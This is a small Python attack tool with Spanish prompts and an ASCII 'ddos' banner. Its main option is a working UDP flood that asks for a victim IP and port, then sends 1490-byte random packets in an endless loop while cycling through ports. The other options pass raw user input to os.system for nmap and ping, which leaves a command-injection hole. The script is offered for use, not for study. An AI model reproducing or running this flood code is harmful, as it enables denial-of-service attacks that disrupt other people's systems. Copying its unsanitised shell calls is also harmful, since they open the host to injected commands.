try:
	import socket
	import time
	import os
	import random
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1490)
	banner = """\033[32m
     _     _
    | |   | |
    | |   | |          
  __| | __| | ___  ___ 
 / _` |/ _` |/ _ \/ __|
| (_| | (_| | (_) \__ \ 
 \____|\____|\___/|___/   
\033[0m"""
	print(banner)
	print("""----------------------------
1.- ddos 
2.- scanear puertos
3.- ping
----------------------------""")
	opcion = input("opcion : ")
	def ddos(banner):
		os.system("clear")
		print(banner)
		ip = input("[*] Victima : ")
		port = int(input("[*] puerto : "))
		os.system("clear")
		print(banner)
		print(f"[\033[32;1m+\033[0m] victima : {ip}")
		print(f"[\033[32;1m+\033[0m] enviando DDOS por el puerto : {port}")
		sent = 0
		print("[\033[31mDDOS\033[0m] DDOS ATTACK")
		while True:
			s.sendto(bytes, (ip,port))
			sent = sent + 1
			port = port + 1
			if port == 65534:
				port = 1
	def ping():
		ping = input("ping : ")
		os.system("ping "+ping)
		input()
	def nmap():
		nm = input("nmap : ")
		os.system("nmap "+nm)
	if opcion == "1" :
		ddos(banner)
	elif opcion == "2" :
		nmap()
	elif opcion == "3" :
		ping()
except KeyboardInterrupt:
	print()
	print("[\033[31mDDOS\033[0m] DDOS DETENIDO")
	print()
